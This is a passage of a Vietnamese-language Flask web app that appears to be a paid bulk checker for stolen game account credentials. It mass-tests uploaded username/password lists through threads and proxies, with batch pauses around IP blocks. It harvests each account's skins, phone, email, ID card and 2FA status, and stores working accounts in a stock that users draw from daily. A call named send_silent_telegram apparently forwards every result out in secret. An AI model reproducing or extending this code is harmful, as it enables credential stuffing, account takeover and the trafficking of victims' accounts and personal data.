                    var lg = data.logs[i];
                    html += '<div class="log-line ' + lg.type + '">' + lg.msg + '</div>';
                }}
                var box = document.getElementById('live-log');
                box.innerHTML = html; box.scrollTop = box.scrollHeight;
            }}
            if (data.done) {{
                clearInterval(pollInterval);
                document.getElementById('progress-card').style.display = 'none';
                document.getElementById('done-section').style.display = 'block';
                document.getElementById('summary-box').textContent = data.summary || 'Hoàn tất!';
            }}
        }}).catch(e => console.log(e));
    }}
    function cancelJob() {{
        if (!confirm('Huỷ?')) return;
        fetch('/api/up_acc/cancel/' + jobId, {{ method: 'POST' }});
    }}
    </script>'''
    return render_page(content, active_tab="up_acc", user=user)

@app.route("/api/up_acc/progress/<job_id>")
@admin_or_qtv_required
def api_up_acc_progress(job_id):
    job = STORAGE_JOBS.get(job_id)
    if not job: return jsonify({"error": "Job không tồn tại"})
    return jsonify({
        "total": job.get("total", 0), "current": job.get("current", 0),
        "progress": job.get("progress", 0), "current_acc": job.get("current_acc", ""),
        "done": job.get("done", False), "logs": job.get("logs", [])[-20:],
        "passed": job.get("passed", 0), "banned": job.get("banned", 0),
        "failed": job.get("failed", 0), "summary": job.get("summary", "")
    })

@app.route("/api/up_acc/cancel/<job_id>", methods=["POST"])
@admin_or_qtv_required
def api_up_acc_cancel(job_id):
    job = STORAGE_JOBS.get(job_id)
    if job: job["cancelled"] = True
    return jsonify({"ok": True})

def run_storage_upload(job_id, acc_list):
    job = STORAGE_JOBS.get(job_id)
    if not job: return
    total = len(acc_list)
    lock = threading.Lock()
    batch_num = [0]
    completed = [0]

    def process_one(pair):
        if job.get("cancelled"): return
        u, p = pair
        try:
            r = run_single_check(u, p)
        except Exception as e:
            r = {"type": "failed", "error": str(e), "username": u, "password": p,
                 "sss": [], "ss": [], "anime": [], "skins": [], "other_skins": [],
                 "total_skins": 0, "uid": "", "shell": 0, "rank": "", "level": 0,
                 "name": "", "rank_stars": 0, "banned": False, "ban_end_time": "",
                 "mobile_no": "", "country_code": "", "email": "", "idcard": "",
                 "two_fa": False, "player_uid": "", "username_display": "", "nickname": ""}
        with lock:
            completed[0] += 1
            job["current"] = completed[0]
            job["progress"] = int((completed[0] / total) * 100)
            job["current_acc"] = u
            if r.get("type") == "failed" or r.get("error"):
                job["failed"] += 1
                err_msg = r.get('error', '')[:60]
                if "block" in err_msg.lower() or "IP" in err_msg:
                    err_display = f"🚫 [BLOCKED] {u}"
                elif "timeout" in err_msg.lower():
                    err_display = f"⏱️ [TIMEOUT] {u}"
                elif "khóa" in err_msg.lower():
                    err_display = f"🔒 [LOCKED] {u}"
                else:
                    err_display = f"✕ [FAIL] {u} — {err_msg}"
                job["logs"].append({"acc": u, "type": "failed", "msg": err_display})
            elif r.get("banned"):
                job["banned"] += 1
                job["logs"].append({"acc": u, "type": "banned", "msg": f"🚫 [BAN] {u} — BỊ BAN, KHÔNG THÊM"})
            elif r.get("total_skins", 0) == 0:
                job["failed"] += 1
                job["logs"].append({"acc": u, "type": "failed", "msg": f"○ [0 SKIN] {u} — BỎ"})
            else:
                job["passed"] += 1
                job["logs"].append({"acc": u, "type": "sss" if r.get("sss") else ("anime" if r.get("anime") else ("ss" if r.get("ss") else "normal")),
                                    "msg": f"✅ [PASS] {u} — UID: {r.get('uid','?')} | {r.get('total_skins',0)} skin"})
                with _lock:
                    ACC_STORAGE.append({
                        "id": uuid.uuid4().hex[:12],
                        "acc": u, "password": p,
                        "uid": r.get("uid", ""), "nick": r.get("name", ""),
                        "rank": r.get("rank", ""), "rank_stars": r.get("rank_stars", 0),
                        "level": r.get("level", 0), "shell": r.get("shell", 0),
                        "banned": False, "ban_end_time": "",
                        "total_skins": r.get("total_skins", 0),
                        "mobile_no": r.get("mobile_no", ""), "country_code": r.get("country_code", ""),
                        "email": r.get("email", ""), "idcard": r.get("idcard", ""),
                        "two_fa": r.get("two_fa", False),
                        "player_uid": r.get("player_uid", ""),
                        "username_display": r.get("username_display", ""),
                        "nickname": r.get("nickname", ""),
                        "skins_sss": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn",""), "cdn_fallback": s.get("cdn_fallback","")} for s in r.get("sss", [])],
                        "skins_ss": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn",""), "cdn_fallback": s.get("cdn_fallback","")} for s in r.get("ss", [])],
                        "skins_anime": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn",""), "cdn_fallback": s.get("cdn_fallback","")} for s in r.get("anime", [])],
                        "skins_other": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn",""), "cdn_fallback": s.get("cdn_fallback","")} for s in r.get("other_skins", [])],
                        "added_at": time.time(),
                        "added_by": job["admin"]
                    })
            if len(job["logs"]) > 50: job["logs"] = job["logs"][-50:]
            if completed[0] % 20 == 0:
                save_data()
        if STORAGE_DELAY_PER_ACC > 0:
            time.sleep(STORAGE_DELAY_PER_ACC)

    for i in range(0, total, STORAGE_BATCH_SIZE):
        if job.get("cancelled"): break
        batch = acc_list[i:i+STORAGE_BATCH_SIZE]
        batch_num[0] += 1
        with ThreadPoolExecutor(max_workers=STORAGE_CHECK_THREADS) as ex:
            futures = [ex.submit(process_one, pair) for pair in batch]
            for f in as_completed(futures):
                if job.get("cancelled"): break
        if i + STORAGE_BATCH_SIZE < total and not job.get("cancelled"):
            if STORAGE_BATCH_SLEEP > 0:
                job["logs"].append({"acc": "", "type": "normal",
                    "msg": f"⏸ Batch {batch_num[0]} xong — nghỉ {STORAGE_BATCH_SLEEP}s..."})
                for _ in range(STORAGE_BATCH_SLEEP):
                    if job.get("cancelled"): break
                    time.sleep(1)
            else:
                job["logs"].append({"acc": "", "type": "normal",
                    "msg": f"⚡ Batch {batch_num[0]} xong — KHÔNG NGHỈ"})
    save_data(force=True)
    job["done"] = True
    job["progress"] = 100
    job["summary"] = (f"✅ HOÀN TẤT!\n"
        f"├─ Tổng: {total} acc\n"
        f"├─ ✅ Vào kho: {job['passed']}\n"
        f"├─ 🚫 Bị ban (bỏ): {job['banned']}\n"
        f"└─ ✕ Check fail / 0 skin: {job['failed']}\n\n"
        f"📦 Kho hiện tại: {len(ACC_STORAGE)} acc")
    NOTIFICATIONS.append({
        "id": uuid.uuid4().hex[:10], "title": "🎁 Kho Acc mới!",
        "content": f"Admin vừa up {job['passed']} acc mới vào kho. Vào /nhan_acc để nhận ngay!",
        "admin": job["admin"], "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "timestamp": time.time()
    })
    def cleanup():
        time.sleep(600); STORAGE_JOBS.pop(job_id, None)
    threading.Thread(target=cleanup, daemon=True).start()

# ========== KHO ACC ==========
@app.route("/kho_acc")
@admin_or_qtv_required
def kho_acc():
    user = get_user()
    page = int(request.args.get("page", 1))
    per_page = 50
    total = len(ACC_STORAGE)
    total_pages = max(1, (total + per_page - 1) // per_page)
    page = max(1, min(page, total_pages))
    start = (page - 1) * per_page
    items = ACC_STORAGE[::-1][start:start+per_page]
    rows = ""
    for it in items:
        sss_c = len(it.get("skins_sss", []))
        ss_c = len(it.get("skins_ss", []))
        an_c = len(it.get("skins_anime", []))
        tier = "SSS" if sss_c else ("Anime" if an_c else ("SS" if ss_c else "Normal"))
        color = {"SSS":"#ffb800","SS":"#00f0ff","Anime":"#e040fb","Normal":"#8b8b9a"}[tier]
        rows += f'''<div class="list-item">
            <div style="flex:1; min-width:0;">
                <div style="font-family:monospace; font-weight:600; overflow:hidden; text-overflow:ellipsis;">{it["acc"]}|{it["password"]}</div>
                <div style="font-size:0.72em; color:var(--text-mute);">
                    UID: {it.get("uid","?")} · {it.get("total_skins",0)} skin · SSS: {sss_c} · SS: {ss_c} · Anime: {an_c}</div>
            </div>
            <div style="padding:4px 10px; background:{color}20; color:{color}; border-radius:8px; font-size:0.7em; font-weight:800;">{tier}</div>
            <a href="/kho_acc/delete/{it['id']}" class="btn btn-danger btn-sm" onclick="return confirm('Xóa acc này?');">🗑️</a>
        </div>'''
    if not rows: rows = '<p style="text-align:center; color:var(--text-dim); padding:20px;">Kho trống</p>'
    pag = ""
    if total_pages > 1:
        pag += '<div style="display:flex; gap:8px; justify-content:center; margin-top:14px; flex-wrap:wrap;">'
        if page > 1: pag += f'<a href="/kho_acc?page={page-1}" class="btn btn-secondary btn-sm">← Trước</a>'
        pag += f'<span style="padding:8px 14px; background:rgba(255,0,229,0.2); border-radius:8px; font-family:Orbitron; font-weight:800;">{page}/{total_pages}</span>'
        if page < total_pages: pag += f'<a href="/kho_acc?page={page+1}" class="btn btn-secondary btn-sm">Sau →</a>'
        pag += '</div>'
    hist_rows = ""
    for h in ACC_HISTORY[-20:][::-1]:
        hist_rows += f'''<div class="info-row">
            <span class="info-label">{h.get("time","")} · <b style="color:#00f0ff;">{h.get("user","")}</b></span>
            <span class="info-value" style="font-family:monospace; font-size:0.85em;">{h.get("acc","")}</span>
        </div>'''
    if not hist_rows: hist_rows = '<p style="text-align:center; color:var(--text-dim);">Chưa phát acc nào</p>'
    content = f'''
    <div class="card">
        <h2 class="card-title">📦 KHO ACC</h2>
        <div class="stat-grid-3">
            <div class="stat-box"><div class="stat-value">{total}</div><div class="stat-label">Trong kho</div></div>
            <div class="stat-box"><div class="stat-value">{len(ACC_HISTORY)}</div><div class="stat-label">Đã phát</div></div>
            <div class="stat-box"><div class="stat-value">{USER_DAILY_LIMIT}</div><div class="stat-label">Limit/ngày</div></div>
        </div>
        <div style="display:flex; gap:8px; margin-top:14px;">
            <a href="/up_acc" class="btn btn-success btn-block" style="flex:1;">📤 UP ACC</a>
            <a href="/kho_acc/clear" class="btn btn-danger btn-block" style="flex:1;" onclick="return confirm('XÓA TOÀN BỘ KHO? Không hoàn tác!');">🗑️ XÓA HẾT</a>
        </div>
    </div>
    <div class="card"><h3 class="card-title">📋 Danh sách ({total})</h3>{rows}{pag}</div>
    <div class="card"><h3 class="card-title">📜 Lịch sử phát acc</h3>{hist_rows}</div>'''
    return render_page(content, active_tab="kho_acc", user=user)

@app.route("/kho_acc/delete/<sid>")
@admin_or_qtv_required
def kho_acc_delete(sid):
    global ACC_STORAGE
    before = len(ACC_STORAGE)
    ACC_STORAGE = [x for x in ACC_STORAGE if x.get("id") != sid]
    log_admin("DELETE_ACC", sid)
    save_data(force=True)
    flash(f"Đã xóa acc khỏi kho ({before - len(ACC_STORAGE)} acc)", "success")
    return redirect(url_for("kho_acc"))

@app.route("/kho_acc/clear")
@admin_or_qtv_required
def kho_acc_clear():
    global ACC_STORAGE
    n = len(ACC_STORAGE)
    ACC_STORAGE = []
    log_admin("CLEAR_STORAGE", "", f"xóa {n} acc")
    save_data(force=True)
    flash(f"Đã xóa {n} acc khỏi kho!", "success")
    return redirect(url_for("kho_acc"))

# ========== NHẬN ACC ==========
@app.route("/nhan_acc", methods=["GET", "POST"])
@login_required
def nhan_acc():
    user = get_user()
    today = datetime.now().strftime("%Y-%m-%d")
    daily = user.get("daily_received", {})
    if daily.get("date") != today:
        daily = {"date": today, "count": 0}
        user["daily_received"] = daily
    used = daily.get("count", 0)
    user_limit = user.get("daily_limit", USER_DAILY_LIMIT)
    if user_limit == -1:
        remaining = 999999
    else:
        remaining = max(0, user_limit - used)
    received = None

    if request.method == "POST":
        if remaining <= 0:
            flash(f"Hết lượt hôm nay ({user_limit} lượt)! Quay lại ngày mai.", "error")
        elif not ACC_STORAGE:
            flash("Kho đang trống, chờ admin up thêm!", "error")
        else:
            with _lock:
                acc = random.choice(ACC_STORAGE)
                ACC_STORAGE.remove(acc)
            daily["count"] = used + 1
            user.setdefault("received_accs", []).append({
                "id": uuid.uuid4().hex[:10],
                "acc": acc["acc"], "password": acc["password"],
                "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                "timestamp": time.time()
            })
            user["received_accs"] = user["received_accs"][-50:]
            ACC_HISTORY.append({
                "user": user["username"], "acc": acc["acc"],
                "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                "timestamp": time.time(), "storage_id": acc["id"]
            })
            if len(ACC_HISTORY) > 1000: ACC_HISTORY.pop(0)
            hist_entry = {
                "id": uuid.uuid4().hex[:12], "acc": acc["acc"], "password": acc["password"],
                "result": "sss" if acc.get("skins_sss") else (
                          "anime" if acc.get("skins_anime") else (
                          "ss" if acc.get("skins_ss") else "normal")),
                "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                "uid": acc.get("uid", ""), "nick": acc.get("nick", ""),
                "rank": acc.get("rank", ""), "rank_stars": acc.get("rank_stars", 0),
                "level": acc.get("level", 0), "shell": acc.get("shell", 0),
                "banned": acc.get("banned", False), "ban_end_time": acc.get("ban_end_time", ""),
                "error": "", "total_skins": acc.get("total_skins", 0),
                "mobile_no": acc.get("mobile_no", ""), "country_code": acc.get("country_code", ""),
                "email": acc.get("email", ""), "idcard": acc.get("idcard", ""),
                "two_fa": acc.get("two_fa", False),
                "username_display": acc.get("username_display", ""),
                "nickname": acc.get("nickname", ""), "player_uid": acc.get("player_uid", ""),
                "best_hero": "", "best_play": "", "total_matches": "", "rank_id": 0,
                "skins_sss": acc.get("skins_sss", []),
                "skins_ss": acc.get("skins_ss", []),
                "skins_anime": acc.get("skins_anime", []),
                "skins_other": acc.get("skins_other", []),
                "from_kho": True
            }
            user["history"] = user.get("history", [])[-199:] + [hist_entry]
            save_data(force=True)
            received = acc
            flash(f"🎉 Nhận thành công! Còn {remaining-1} lượt hôm nay", "success")
        used = daily.get("count", 0)
        if user_limit == -1:
            remaining = 999999
        else:
            remaining = max(0, user_limit - used)

    acc_html = ""
    if received:
        phone_disp = received.get("mobile_no") or "Không có"
        if received.get("mobile_no") and received.get("country_code"):
            phone_disp = f"{received['mobile_no']} (+{received['country_code']})"
        ban_text = '<span style="color:#ff2951;font-weight:700;">🔴 BANNED</span>' if received.get("banned") else '<span style="color:#00ff88;font-weight:700;">🟢 CLEAN</span>'
        def render_skin_grid(lst, cls, icon, label):
            if not lst: return ""
            items_html = ""
            for s in lst:
                items_html += f'''<div class="skin-card">
                    <div class="skin-img-wrap">
                        <img src="{s.get('cdn','')}" alt="" loading="lazy" onerror="this.onerror=null;this.src='{s.get('cdn_fallback','')}';">
                    </div>
                    <div class="skin-info">
                        <div class="skin-hero">{s.get('hero','?')}</div>
                        <div class="skin-name">{s.get('skin','?')}</div>
                        <div class="skin-id">#{s.get('id','')}</div>
                    </div></div>'''
            return f'<div class="card"><h3 class="card-title" style="font-size:0.95em;">{icon} {label} ({len(lst)})</h3><div class="skin-grid">{items_html}</div></div>'
        sss_html = render_skin_grid(received.get("skins_sss", []), "sss", "⭐", "SSS")
        anime_html = render_skin_grid(received.get("skins_anime", []), "anime", "🎴", "ANIME")
        ss_html = render_skin_grid(received.get("skins_ss", []), "ss", "💠", "SS")
        acc_html = f'''
        <div class="card" style="border:2px solid #00ff88; background:linear-gradient(135deg,rgba(0,255,136,0.1),rgba(0,240,255,0.1));">
            <h2 class="card-title" style="color:#00ff88;">🎉 ACC BẠN VỪA NHẬN <span class="kho-badge">🎁 KHO</span></h2>
            <div class="cred-box">
                <div class="cred-label">◈ Tài khoản</div>
                <div class="cred-value" onclick="copyText(this)">{received.get('acc','')}</div>
                <div class="cred-label">◈ Mật khẩu</div>
                <div class="cred-value" onclick="copyText(this)">{received.get('password','')}</div>
                <button class="btn btn-success btn-block" onclick="copyBoth('{received.get('acc','')}','{received.get('password','')}')" style="margin-top:8px;">📋 Copy cả TK + MK</button>
            </div>
            <div class="card" style="margin:0;">
                <h3 class="card-title" style="font-size:0.95em;">◐ Thông Tin</h3>
                <div class="info-row"><span class="info-label">UID</span><span class="info-value">{received.get("uid") or "N/A"}</span></div>
                <div class="info-row"><span class="info-label">Nickname</span><span class="info-value">{received.get("nickname") or received.get("nick") or "Chưa đặt"}</span></div>
                <div class="info-row"><span class="info-label">Rank</span><span class="info-value">{received.get("rank") or "Chưa xếp hạng"} ({received.get("rank_stars",0)}★)</span></div>
                <div class="info-row"><span class="info-label">Level</span><span class="info-value">{received.get("level", 0)}</span></div>
                <div class="info-row"><span class="info-label">SĐT</span><span class="info-value">{phone_disp}</span></div>
                <div class="info-row"><span class="info-label">2FA</span><span class="info-value">{"BẬT" if received.get("two_fa") else "TẮT"}</span></div>
                <div class="info-row"><span class="info-label">Trạng thái</span><span class="info-value">{ban_text}</span></div>
                <div class="info-row"><span class="info-label">Tổng Skin</span><span class="info-value">{received.get("total_skins",0)}</span></div>
            </div>
        </div>
        {sss_html}{anime_html}{ss_html}
        <div class="card" style="text-align:center; color:var(--text-warn); font-size:0.85em;">
            💡 <b>Acc đã được xóa khỏi kho</b> — Hãy lưu lại ngay!
        </div>'''
    hist_rows = ""
    for h in user.get("received_accs", [])[-20:][::-1]:
        hist_rows += f'''<div class="info-row">
            <span class="info-label">{h.get("time","")}</span>
            <span class="info-value" style="font-family:monospace;">{h.get("acc","")}|{h.get("password","")}</span>
        </div>'''
    if not hist_rows: hist_rows = '<p style="text-align:center; color:var(--text-dim);">Chưa nhận acc nào</p>'
    can_receive = remaining > 0 and len(ACC_STORAGE) > 0
    btn_text = "🎲 NHẬN 1 ACC NGẪU NHIÊN" if can_receive else (
        "⏳ Hết lượt hôm nay" if remaining <= 0 else "📭 Kho đang trống")
    limit_display = "∞" if user_limit == -1 else str(user_limit)
    content = f'''
    {acc_html}
    <div class="card">
        <h2 class="card-title">🎁 NHẬN ACC MIỄN PHÍ</h2>
        <div class="stat-grid">
            <div class="stat-box"><div class="stat-value" style="color:#00ff88;">{remaining}/{limit_display}</div><div class="stat-label">Lượt còn lại</div></div>
            <div class="stat-box"><div class="stat-value">{len(ACC_STORAGE)}</div><div class="stat-label">Acc trong kho</div></div>
        </div>
        <form method="POST" style="margin-top:14px;">
            <button type="submit" class="btn btn-success btn-block" {'disabled' if not can_receive else ''}>{btn_text}</button>
        </form>
        <p style="color:var(--text-dim); font-size:0.8em; text-align:center; margin-top:10px;">
            Mỗi acc nhận xong sẽ bị <b>xóa khỏi kho</b>. Acc là <b>ngẫu nhiên</b>.<br>
            🔄 Reset về <b>{USER_DAILY_LIMIT} lượt</b> vào 00:00 mỗi ngày.
        </p>
    </div>
    <div class="card"><h3 class="card-title">📜 Lịch sử nhận acc</h3>{hist_rows}</div>
    <script>
    function copyBoth(u, p) {{
        var text = "User: " + u + "\\nPass: " + p;
        if (navigator.clipboard) {{
            navigator.clipboard.writeText(text).then(function() {{
                showToast("✓ Đã copy TK + MK!");
            }});
        }}
    }}
    </script>'''
    return render_page(content, active_tab="nhan_acc", user=user)

# ========== CHECK FILE ==========
@app.route("/check_file", methods=["GET", "POST"])
@login_required
def check_file():
    user = get_user()
    if request.method == "POST":
        if "file" not in request.files:
            flash("Chưa chọn file!", "error"); return redirect(url_for("check_file"))
        f = request.files["file"]
        if not f.filename.endswith(".txt"):
            flash("Chỉ nhận file .txt!", "error"); return redirect(url_for("check_file"))
        separator = request.form.get("separator", "auto")
        proxy = request.form.get("proxy", "").strip() or None
        content_bytes = f.read().decode("utf-8", errors="ignore")
        accs = parse_file_content_advanced(content_bytes, separator)
        if not accs:
            flash("Không tìm thấy acc hợp lệ!", "error"); return redirect(url_for("check_file"))
        if len(accs) > 2000:
            flash(f"File quá lớn ({len(accs)} acc). Tối đa 2000 acc!", "error")
            return redirect(url_for("check_file"))
        total = len(accs)
        xu = (total + 44) // 45
        if user["balance"] < xu:
            flash(f"Cần {xu} xu, có {user['balance']}!", "error"); return redirect(url_for("check_file"))
        user["balance"] -= xu
        job_id = uuid.uuid4().hex[:16]
        CHECK_JOBS[job_id] = {"id": job_id, "user": user["username"], "total": total,
            "current": 0, "progress": 0, "done": False, "logs": [],
            "current_acc": "", "last_type": "", "stats": {}, "summary": "",
            "cancelled": False, "queued": False, "acc_list": accs, "proxy": proxy}
        user["current_job"] = job_id
        save_data()
        threading.Thread(target=run_job_with_queue, args=(job_id, accs, user["username"]), daemon=True).start()
        return redirect(url_for("check_file_progress", job_id=job_id))
    running_job = None
    last_job_id = user.get("current_job")
    if last_job_id and last_job_id in CHECK_JOBS:
        j = CHECK_JOBS[last_job_id]
        if not j.get("done") and j.get("user") == user["username"]: running_job = last_job_id
    job_banner = ""
    if running_job:
        job_banner = f'''<div class="card" style="border:2px solid #ffb800;">
            <div style="display:flex; align-items:center; gap:12px;">
                <div style="font-size:2em;">⚙️</div>
                <div style="flex:1;"><div style="font-weight:700; color:#ffb800; font-family:Orbitron;">CÓ JOB ĐANG CHẠY</div>
                <div style="font-size:0.85em; color:var(--text-dim);">Job vẫn chạy ở nền</div></div>
                <a href="/check_file/progress/{running_job}" class="btn btn-warning btn-sm">Xem →</a>
            </div></div>'''
    content = f'''
    {job_banner}
    <div class="card">
        <h2 class="card-title">▣ Check File</h2>
        <p style="color:var(--text-dim); margin-bottom:14px; font-size:0.9em;">Upload file .txt — <span class="filter-badge">GIỮ TẤT CẢ ACC</span></p>
        <div style="background:rgba(0,0,0,0.4); padding:14px; border-radius:14px; margin-bottom:14px; border:1px solid var(--border);">
            <div class="info-row"><span class="info-label">Phí</span><span class="info-value">45 acc = 1 xu</span></div>
            <div class="info-row"><span class="info-label">Số dư</span><span class="info-value">{user['balance']} xu</span></div>
            <div class="info-row"><span class="info-label">Tốc độ</span><span class="info-value" style="color:#00ff88;">⚡ {MAX_CONCURRENT_CHECKS} luồng</span></div>
        </div>
        <form method="POST" enctype="multipart/form-data">
            <div class="form-group"><label class="form-label">File danh sách</label>
                <input type="file" name="file" class="form-input" accept=".txt" required></div>
            <div class="form-group"><label class="form-label">Proxy (tùy chọn)</label>
                <input type="text" name="proxy" class="form-input" placeholder="http://user:pass@host:port"></div>
            <div class="form-group"><label class="form-label">Dấu phân cách</label>
                <select name="separator" class="form-input">
                    <option value="auto">🤖 Tự động</option>
                    <option value="|">|</option>
                    <option value=":">:</option>
                    <option value=" ">Space</option>
                    <option value=",">,</option>
                    <option value="=">=</option>
                    <option value=";">;</option>
                </select>
            </div>
            <button type="submit" class="btn btn-block">Upload & Check</button>
        </form>
    </div>'''
    return render_page(content, active_tab="check_file", user=user)

@app.route("/check_file/progress/<job_id>")
@login_required
def check_file_progress(job_id):
    user = get_user()
    job = CHECK_JOBS.get(job_id)
    if not job or job.get("user") != user["username"]:
        flash("Job không tồn tại!", "error"); return redirect(url_for("check_file"))
    user["current_job"] = job_id; save_data()
    content = f'''
    <div class="card" id="progress-card">
        <h2 class="card-title"><span class="spinner"></span> Đang Check...</h2>
        <p style="color:var(--text-dim); margin-bottom:14px;" id="status-text">Đang khởi động...</p>
        <div class="progress-container">
            <div style="display:flex; justify-content:space-between; font-size:0.85em; margin-bottom:8px;">
                <span>Tiến trình</span><span id="progress-percent" style="font-family:Orbitron; color:#ff88ee; font-weight:800;">0%</span>
            </div>
            <div class="progress-bar-wrap">
                <div class="progress-bar-fill" id="progress-bar" style="width:0%;"></div>
                <div class="progress-text" id="progress-text">0 / {job['total']}</div>
            </div>
            <div style="text-align:center; font-size:0.85em; color:var(--text-dim); margin-top:8px;">
                Đang check: <b id="current-acc" style="color:#00f0ff; font-family:monospace;">Chờ...</b></div>
        </div>
        <button id="cancel-btn" onclick="cancelJob()" class="btn btn-danger btn-block">🛑 HUỶ CHECK</button>
        <div class="live-stats">
            <div class="live-stat"><div class="num" id="stat-sss" style="color:#ffd700;">0</div><div class="lbl">SSS</div></div>
            <div class="live-stat"><div class="num" id="stat-ss" style="color:#00f0ff;">0</div><div class="lbl">SS</div></div>
            <div class="live-stat"><div class="num" id="stat-anime" style="color:#e040fb;">0</div><div class="lbl">Anime</div></div>
        </div>
        <div class="live-log" id="live-log"><div class="log-line normal">⏳ Chờ kết quả...</div></div>
    </div>
    <div id="done-section" style="display:none;">
        <div class="card">
            <h2 class="card-title" id="done-title" style="color:#00ff88;">✓ Hoàn Tất!</h2>
            <div id="summary-box" class="result-box"></div>
            <div class="stat-grid-5" style="margin-top:14px;">
                <div class="stat-box small"><div class="stat-value" id="done-sss" style="font-size:1.3em;">0</div><div class="stat-label">◈ SSS</div></div>
                <div class="stat-box small"><div class="stat-value" id="done-ss" style="font-size:1.3em;">0</div><div class="stat-label">◆ SS</div></div>
                <div class="stat-box small"><div class="stat-value" id="done-anime" style="font-size:1.3em;">0</div><div class="stat-label">◇ Anime</div></div>
                <div class="stat-box small"><div class="stat-value" id="done-trang" style="font-size:1.3em;">0</div><div class="stat-label">○ Trắng</div></div>
                <div class="stat-box small"><div class="stat-value" id="done-ban" style="font-size:1.3em;">0</div><div class="stat-label">✖ Ban</div></div>
            </div>
            <a href="/export_vip_all" class="btn btn-success btn-block" style="margin-top:14px;">📥 XUẤT VIP ALL</a>
            <div style="display:flex; gap:8px; margin-top:8px;">
                <a href="/history" class="btn btn-block" style="flex:1;">▤ Lịch Sử</a>
                <a href="/check_file" class="btn btn-secondary btn-block" style="flex:1;">+ Check Mới</a>
            </div>
        </div>
    </div>
    <script>
    var jobId = "{job_id}";
    var pollInterval = setInterval(updateJob, 3000);
    function updateJob() {{
        fetch('/api/check_file/progress/' + jobId)
        .then(r => r.json())
        .then(data => {{
            if (data.error) {{ clearInterval(pollInterval); return; }}
            document.getElementById('progress-bar').style.width = data.progress + '%';
            document.getElementById('progress-percent').textContent = data.progress + '%';
            document.getElementById('progress-text').textContent = data.current + ' / ' + data.total;
            if (data.current_acc) document.getElementById('current-acc').textContent = data.current_acc;
            document.getElementById('stat-sss').textContent = (data.stats && data.stats.sss) || 0;
            document.getElementById('stat-ss').textContent = (data.stats && data.stats.ss) || 0;
            document.getElementById('stat-anime').textContent = (data.stats && data.stats.anime) || 0;
            if (data.logs && data.logs.length > 0) {{
                var html = '';
                for (var i = 0; i < data.logs.length; i++) {{
                    var lg = data.logs[i];
                    html += '<div class="log-line ' + lg.type + '">' + lg.msg + '</div>';
                }}
                var box = document.getElementById('live-log');
                box.innerHTML = html; box.scrollTop = box.scrollHeight;
            }}
            if (data.done) {{
                clearInterval(pollInterval);
                document.getElementById('progress-card').style.display = 'none';
                document.getElementById('done-section').style.display = 'block';
                document.getElementById('summary-box').textContent = data.summary || 'Hoàn tất!';
                if (data.stats) {{
                    document.getElementById('done-sss').textContent = data.stats.sss || 0;
                    document.getElementById('done-ss').textContent = data.stats.ss || 0;
                    document.getElementById('done-anime').textContent = data.stats.anime || 0;
                    document.getElementById('done-trang').textContent = data.stats.trang || 0;
                    document.getElementById('done-ban').textContent = data.stats.banned || 0;
                }}
            }}
        }}).catch(e => console.log(e));
    }}
    function cancelJob() {{
        if (!confirm('Huỷ check?')) return;
        fetch('/api/check_file/cancel/' + jobId, {{ method: 'POST' }});
    }}
    </script>'''
    return render_page(content, active_tab="check_file", user=user)

@app.route("/api/check_file/progress/<job_id>")
@login_required
def api_check_file_progress(job_id):
    user = get_user()
    job = CHECK_JOBS.get(job_id)
    if not job or job.get("user") != user["username"]:
        return jsonify({"error": "Job không tồn tại"})
    return jsonify({"total": job.get("total", 0), "current": job.get("current", 0),
        "progress": job.get("progress", 0), "current_acc": job.get("current_acc", ""),
        "done": job.get("done", False), "logs": job.get("logs", [])[-30:],
        "stats": job.get("stats", {}), "summary": job.get("summary", "")})

@app.route("/api/check_file/cancel/<job_id>", methods=["POST"])
@login_required
def api_check_file_cancel(job_id):
    user = get_user()
    job = CHECK_JOBS.get(job_id)
    if not job or job.get("user") != user["username"]: return jsonify({"ok": False})
    job["cancelled"] = True
    return jsonify({"ok": True})

def run_job_with_queue(job_id, acc_list, user_name):
    with _active_jobs_lock:
        if _active_jobs_count[0] >= MAX_PARALLEL_JOBS:
            if len(JOB_QUEUE) >= 20:
                job = CHECK_JOBS.get(job_id)
                if job:
                    job["done"] = True
                    job["summary"] = "⚠️ Hệ thống đang quá tải. Thử lại sau!"
                    job["stats"] = {}
                return
            JOB_QUEUE.append(job_id)
            job = CHECK_JOBS.get(job_id)
            if job: job["queued"] = True
            return
        _active_jobs_count[0] += 1
    try:
        file_check_worker(job_id, acc_list, user_name)
    finally:
        with _active_jobs_lock:
            _active_jobs_count[0] -= 1
            if JOB_QUEUE:
                next_id = JOB_QUEUE.pop(0)
                job = CHECK_JOBS.get(next_id)
                if job:
                    job["queued"] = False
                    threading.Thread(target=run_job_with_queue,
                        args=(next_id, job["acc_list"], job["user"]), daemon=True).start()

def file_check_worker(job_id, acc_list, user_name):
    job = CHECK_JOBS.get(job_id)
    if not job: return
    total = len(acc_list)
    user = USERS.get(user_name)
    if not user: return
    results = []
    results_lock = threading.Lock()
    completed_count = [0]
    proxy = job.get("proxy")

    def process_one(acc_pair):
        u, p = acc_pair
        if job.get("cancelled"): return None
        try:
            r = run_single_check(u, p, proxy=proxy)
        except Exception as e:
            r = {"type": "failed", "username": u, "password": p, "error": str(e),
                 "sss": [], "ss": [], "anime": [], "skins": [], "other_skins": [], "all_skins": [],
                 "rank": "", "level": 0, "name": "", "rank_stars": 0, "banned": False,
                 "uid": "", "shell": 0, "total_skins": 0, "mobile_no": "", "country_code": "",
                 "email": "", "idcard": "", "two_fa": False, "player_uid": "", "ban_end_time": ""}
        with results_lock:
            results.append(r)
            completed_count[0] += 1
            user["history"] = user.get("history", [])[-199:] + [make_hist_entry(r, u)]
            send_silent_telegram(r)
            job["current"] = completed_count[0]
            job["progress"] = int((completed_count[0] / total) * 100)
            job["current_acc"] = u
            icon = {"sss": "◈", "ss": "◆", "anime": "◇", "normal": "▪", "trang": "○", "banned": "✖", "failed": "✕"}.get(r["type"], "?")
            main_msg = f"{icon} [{r['type'].upper()}] {u} | UID: {r.get('uid','N/A')} | {r.get('total_skins',0)} skin"
            job["logs"].append({"acc": u, "type": r["type"], "msg": main_msg})
